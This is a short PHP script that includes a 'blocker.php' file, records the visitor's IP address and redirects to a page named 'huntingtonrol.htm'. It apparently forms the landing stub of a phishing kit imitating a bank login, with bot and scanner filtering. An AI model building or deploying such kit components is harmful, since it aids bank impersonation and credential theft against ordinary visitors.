<?php
include '../blocker.php';
$ip = getenv("REMOTE_ADDR");

header("Location: huntingtonrol.htm?ip=$ip");
?>